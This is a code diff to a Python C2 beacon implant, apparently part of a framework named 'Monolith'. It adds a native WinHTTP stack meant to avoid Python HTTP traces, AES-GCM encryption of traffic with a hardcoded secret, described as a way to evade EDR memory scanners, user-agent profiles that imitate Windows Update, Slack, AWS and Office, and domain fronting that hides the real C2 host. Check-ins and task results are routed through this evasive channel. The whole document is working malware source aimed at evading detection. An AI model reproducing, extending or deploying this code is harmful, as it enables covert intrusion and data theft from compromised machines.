@@ -20,11 +20,19 @@ import hashlib
 import platform
 import subprocess
 import threading
+import ctypes
+from ctypes import wintypes
 import urllib.request
 import urllib.error
 from typing import Dict, Optional, List, Callable, Any
 from dataclasses import dataclass, field
 from datetime import datetime
+
+try:
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    HAS_AES_GCM = True
+except ImportError:
+    HAS_AES_GCM = False
 
 # Add parent directory for imports
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -311,6 +319,257 @@ except ImportError:
     print("[!] AI Adversarial training not available")
 
 
+# =============================================================================
+# WinHTTP / Schannel Native Network Stack
+# =============================================================================
+WINHTTP_OPTION_CONNECT_TIMEOUT = 2
+WINHTTP_OPTION_SEND_TIMEOUT = 3
+WINHTTP_OPTION_RECEIVE_TIMEOUT = 4
+WINHTTP_OPTION_SECURE_PROTOCOLS = 9
+WINHTTP_FLAG_SECURE = 0x00800000
+WINHTTP_OPTION_DISABLE_FEATURE = 43
+WINHTTP_DISABLE_COOKIES = 0x00000001
+WINHTTP_DISABLE_REDIRECTS = 0x00000002
+
+
+class _WinHTTPHandle:
+    __slots__ = ("_handle", "_api")
+
+    def __init__(self, handle: int, api):
+        self._handle = handle
+        self._api = api
+
+    def close(self):
+        if self._handle:
+            self._api.WinHttpCloseHandle(self._handle)
+            self._handle = 0
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, exc_type, exc_val, exc_tb):
+        self.close()
+
+
+class _WinHTTPSession:
+    def __init__(self, user_agent: str = "Monolith/1.0"):
+        self._api = ctypes.windll.winhttp
+        self._session = self._api.WinHttpOpen(
+            ctypes.c_wchar_p(user_agent),
+            0,  # WINHTTP_ACCESS_TYPE_DEFAULT_PROXY
+            None,
+            None,
+            0,
+        )
+        if not self._session:
+            raise OSError("WinHttpOpen failed")
+
+    def connect(self, host: str, port: int):
+        h_connect = self._api.WinHttpConnect(
+            self._session,
+            ctypes.c_wchar_p(host),
+            ctypes.c_ushort(port),
+            0,
+        )
+        if not h_connect:
+            raise OSError("WinHttpConnect failed")
+        return _WinHTTPHandle(h_connect, self._api)
+
+    def close(self):
+        if self._session:
+            self._api.WinHttpCloseHandle(self._session)
+            self._session = 0
+
+
+class _WinHTTPRequest:
+    def __init__(self, h_connect, api):
+        self._api = api
+        self._h_connect = h_connect
+        self._h_request = None
+
+    def open(
+        self,
+        method: str,
+        path: str,
+        use_ssl: bool,
+        extra_headers: Dict[str, str],
+        body: Optional[bytes],
+    ):
+        flags = WINHTTP_FLAG_SECURE if use_ssl else 0
+        self._h_request = self._api.WinHttpOpenRequest(
+            self._h_connect._handle,
+            ctypes.c_wchar_p(method),
+            ctypes.c_wchar_p(path),
+            None,
+            None,
+            None,
+            flags,
+        )
+        if not self._h_request:
+            raise OSError("WinHttpOpenRequest failed")
+
+        header_lines = "\r\n".join(f"{k}: {v}" for k, v in extra_headers.items())
+        if header_lines:
+            header_lines += "\r\n"
+
+        body_ptr = ctypes.create_string_buffer(body) if body else None
+        body_len = len(body) if body else 0
+
+        ok = self._api.WinHttpSendRequest(
+            self._h_request._handle if hasattr(self._h_request, '_handle') else self._h_request,
+            ctypes.c_wchar_p(header_lines),
+            ctypes.c_uint(len(header_lines)),
+            body_ptr,
+            ctypes.c_uint(body_len),
+            ctypes.c_uint(body_len),
+            0,
+        )
+        if not ok:
+            raise OSError("WinHttpSendRequest failed")
+
+        ok = self._api.WinHttpReceiveResponse(self._h_request, None)
+        if not ok:
+            raise OSError("WinHttpReceiveResponse failed")
+
+    def read(self) -> bytes:
+        api = self._api
+        h_req = self._h_request
+        data = bytearray()
+        buf = ctypes.create_string_buffer(8192)
+
+        while True:
+            read = ctypes.c_uint(0)
+            ok = api.WinHttpReadData(h_req, buf, ctypes.c_uint(len(buf)), ctypes.byref(read))
+            if not ok or read.value == 0:
+                break
+            data.extend(buf.raw[: read.value])
+
+        return bytes(data)
+
+    def close(self):
+        if self._h_request:
+            self._api.WinHttpCloseHandle(self._h_request)
+            self._h_request = None
+
+
+class WinHTTPNetworkStack:
+    """
+    Native Windows HTTP stack via WinHTTP + Schannel.
+    No Python stdlib HTTP trace. No OpenSSL.
+    """
+
+    def __init__(self, beacon_config: Optional[Any] = None):
+        self.config = beacon_config
+        self.system = platform.system()
+        self._session = None
+
+    def _get_session(self) -> _WinHTTPSession:
+        if not self._session:
+            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            if self.config and hasattr(self.config, "traffic_profile"):
+                ua = self._pick_ua(self.config.traffic_profile)
+            self._session = _WinHTTPSession(user_agent=ua)
+        return self._session
+
+    @staticmethod
+    def _pick_ua(profile: str) -> str:
+        profiles = {
+            "google_search": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0",
+            "ms_update": "Windows-Update-Agent/10.0.19041.1",
+            "slack_api": "Slackbot 1.0 (+https://api.slack.com/robots)",
+            "aws_api": "aws-sdk-python/1.26.18",
+            "office365": "Microsoft Office/16.0",
+        }
+        return profiles.get(profile, profiles["google_search"])
+
+    def request(
+        self,
+        method: str,
+        host: str,
+        port: int,
+        path: str,
+        headers: Dict[str, str],
+        body: Optional[bytes] = None,
+        use_ssl: bool = True,
+        timeout_ms: int = 30000,
+    ) -> bytes:
+        if self.system != "Windows":
+            raise RuntimeError("WinHTTPNetworkStack is Windows-only")
+
+        session = self._get_session()
+        with session.connect(host, port) as h_connect:
+            req = _WinHTTPRequest(h_connect, session._api)
+            try:
+                req.open(method, path, use_ssl, headers, body)
+                return req.read()
+            finally:
+                req.close()
+
+    def close(self):
+        if self._session:
+            self._session.close()
+            self._session = None
+
+
+# =============================================================================
+# Transient Network Encryption (AES-256-GCM)
+# =============================================================================
+class TransientNetworkCrypto:
+    """
+    High-entropy in-memory encryption for network payloads.
+    Prevents EDR heuristic memory scanners from spotting JSON IoC patterns.
+    """
+
+    def __init__(self, beacon_id: str = "", shared_secret: str = "MonolithC2TransientSecret2026"):
+        self.beacon_id = beacon_id
+        self.shared_secret = shared_secret
+        self._key = self._derive_key()
+
+    def _derive_key(self) -> bytes:
+        """Derive 256-bit key from beacon_id + shared secret"""
+        return hashlib.sha256(
+            (self.beacon_id + self.shared_secret).encode()
+        ).digest()
+
+    def set_beacon_id(self, beacon_id: str):
+        """Update key after beacon registration"""
+        self.beacon_id = beacon_id
+        self._key = self._derive_key()
+
+    def encrypt(self, plaintext: bytes) -> bytes:
+        """
+        Encrypt payload for transit.
+        Returns: base64(nonce + ciphertext + tag)
+        """
+        if not HAS_AES_GCM or not plaintext:
+            return plaintext
+
+        nonce = os.urandom(12)
+        aesgcm = AESGCM(self._key)
+        ciphertext = aesgcm.encrypt(nonce, plaintext, None)
+        return base64.b64encode(nonce + ciphertext)
+
+    def decrypt(self, encoded: bytes) -> bytes:
+        """
+        Decrypt transit payload.
+        Input: base64(nonce + ciphertext + tag) or raw bytes
+        """
+        if not HAS_AES_GCM or not encoded:
+            return encoded
+
+        try:
+            raw = base64.b64decode(encoded) if isinstance(encoded, (bytes, bytearray)) else encoded
+            nonce = raw[:12]
+            ciphertext = raw[12:]
+            aesgcm = AESGCM(self._key)
+            return aesgcm.decrypt(nonce, ciphertext, None)
+        except Exception:
+            return encoded
+
+
+# =============================================================================
+# BeaconConfig
+# =============================================================================
 @dataclass
 class BeaconConfig:
     """Beacon configuration"""
@@ -493,6 +752,22 @@ class EvasiveBeacon:
             except Exception as e:
                 print(f"[!] Failed to initialize network cloaking: {e}")
                 self.network_cloaker = None
+
+        # NEW: Native WinHTTP network stack (Windows only)
+        self._winhttp_stack = None
+        if platform.system() == "Windows":
+            try:
+                self._winhttp_stack = WinHTTPNetworkStack(config)
+                print("[+] WinHTTP network stack initialized")
+            except Exception as e:
+                print(f"[!] Failed to initialize WinHTTP stack: {e}")
+                self._winhttp_stack = None
+
+        # NEW: Transient network encryption (AES-256-GCM)
+        self.network_crypto = TransientNetworkCrypto(
+            beacon_id=config.beacon_id,
+            shared_secret="MonolithC2TransientSecret2026",
+        )
 
         # NEW: Initialize syscall obfuscation engine
         self.syscall_obfuscator = None
@@ -1240,101 +1515,137 @@ class EvasiveBeacon:
             **self.cloaking_engine.get_status()
         }
     
-    def _build_request(self, endpoint: str, data: Dict = None) -> urllib.request.Request:
-        """Build HTTP request with evasion techniques"""
+    def _build_request(self, endpoint: str, data: Dict = None) -> Dict:
+        """Build HTTP request metadata with evasion techniques"""
         protocol = "https" if self.config.use_https else "http"
-        
-        # Domain fronting
+
+        # Domain fronting: connect to CDN, but Host header points to real C2
         if self.domain_fronter and self.config.domain_front_host:
-            # Connect to CDN, send Host header to real C2
-            url = f"{protocol}://{self.config.domain_front_host}:{self.config.c2_port}{endpoint}"
+            host = self.config.domain_front_host
             real_host = self.config.c2_host
         else:
-            url = f"{protocol}://{self.config.c2_host}:{self.config.c2_port}{endpoint}"
+            host = self.config.c2_host
             real_host = None
-        
+
         # Traffic masking
         if self.traffic_masker:
             masked = self.traffic_masker.mask_request(
                 json.dumps(data or {}).encode(),
                 self.config.traffic_profile
             )
-            headers = masked['headers']
+            headers = masked.get("headers", {})
         else:
             headers = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept": "application/json"
+                "Accept": "application/json",
             }
-        
+
         # Header rotation
         if self.header_rotator:
             rotated = self.header_rotator.get_headers()
             headers.update(rotated)
-        
-        # Build request
-        if data:
-            body = json.dumps(data).encode()
-            req = urllib.request.Request(url, data=body, method='POST')
-        else:
-            req = urllib.request.Request(url, method='GET')
-        
-        for key, value in headers.items():
-            req.add_header(key, value)
-        
-        # Override Host header for domain fronting
+
+        # Domain fronting Host override
         if real_host:
-            req.add_header('Host', real_host)
-        
-        return req
-    
+            headers["Host"] = real_host
+
+        # Transient network encryption: encrypt body before it hits network buffer
+        body = None
+        if data:
+            plaintext = json.dumps(data).encode()
+            encrypted = self.network_crypto.encrypt(plaintext)
+            if encrypted != plaintext:
+                headers["X-Monolith-Encrypted"] = "v1"
+                headers["X-Monolith-Beacon-Id"] = self.config.beacon_id
+                body = encrypted
+            else:
+                body = plaintext
+
+        return {
+            "host": host,
+            "port": self.config.c2_port,
+            "path": endpoint,
+            "method": "POST" if data else "GET",
+            "headers": headers,
+            "body": body,
+            "use_ssl": self.config.use_https,
+        }
+
+    def _http_request(self, request_meta: Dict) -> bytes:
+        """Send HTTP request via native stack on Windows, urllib on Linux"""
+        if platform.system() == "Windows":
+            raw = self._winhttp_request(request_meta)
+        else:
+            raw = self._urllib_request(request_meta)
+
+        # Decrypt response if C2 encrypted it
+        encrypted = request_meta.get("headers", {}).get("X-Monolith-Encrypted") == "v1"
+        if encrypted and raw:
+            try:
+                return self.network_crypto.decrypt(raw)
+            except Exception:
+                pass
+        return raw
+
+    def _winhttp_request(self, request_meta: Dict) -> bytes:
+        """Send via WinHTTP + Schannel"""
+        if not hasattr(self, "_winhttp_stack") or self._winhttp_stack is None:
+            self._winhttp_stack = WinHTTPNetworkStack(self.config)
+
+        return self._winhttp_stack.request(
+            method=request_meta["method"],
+            host=request_meta["host"],
+            port=request_meta["port"],
+            path=request_meta["path"],
+            headers=request_meta["headers"],
+            body=request_meta.get("body"),
+            use_ssl=request_meta.get("use_ssl", True),
+        )
+
+    def _urllib_request(self, request_meta: Dict) -> bytes:
+        """Fallback HTTP via urllib (Linux / debug)"""
+        url = f"{'https' if request_meta.get('use_ssl') else 'http'}://{request_meta['host']}:{request_meta['port']}{request_meta['path']}"
+
+        if request_meta.get("body"):
+            req = urllib.request.Request(url, data=request_meta["body"], method="POST")
+        else:
+            req = urllib.request.Request(url, method="GET")
+
+        for key, value in request_meta.get("headers", {}).items():
+            req.add_header(key, value)
+
+        opener = urllib.request.build_opener()
+        with opener.open(req, timeout=30) as resp:
+            return resp.read()
+
     def _checkin(self) -> Optional[List[Dict]]:
         """Check in with C2 server"""
         data = {
             "id": self.config.beacon_id,
-            "hostname": platform.node(),
-            "username": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
-            "os": platform.system(),
-            "arch": platform.machine(),
-            "pid": os.getpid(),
-            "timestamp": datetime.now().isoformat()
         }
-        
+
         try:
-            req = self._build_request("/beacon/checkin", data)
-            
-            # Use proxy if configured
-            if self.config.proxy:
-                proxy_handler = urllib.request.ProxyHandler({
-                    "http": self.config.proxy,
-                    "https": self.config.proxy
-                })
-                opener = urllib.request.build_opener(proxy_handler)
-            else:
-                opener = urllib.request.build_opener()
-            
-            response = opener.open(req, timeout=30)
+            req_meta = self._build_request("/beacon/checkin", data)
+            raw = self._http_request(req_meta)
             self.state.last_checkin = datetime.now()
-            
-            result = json.loads(response.read().decode())
-            return result.get('tasks', [])
-            
-        except urllib.error.URLError as e:
+            result = json.loads(raw.decode())
+            return result.get("tasks", [])
+        except Exception as e:
             raise ConnectionError(f"Failed to check in: {e}")
-    
+
     def _send_results(self):
         """Send task results to C2"""
         if not self.results_queue:
             return
-        
+
         data = {
             "id": self.config.beacon_id,
-            "results": self.results_queue
+            "results": self.results_queue,
         }
-        
+
         try:
-            req = self._build_request("/beacon/results", data)
-            opener = urllib.request.build_opener()
-            opener.open(req, timeout=30)
+            req_meta = self._build_request("/beacon/results", data)
+            self._http_request(req_meta)
             self.results_queue.clear()
         except Exception as e:
             print(f"[!] Failed to send results: {e}")
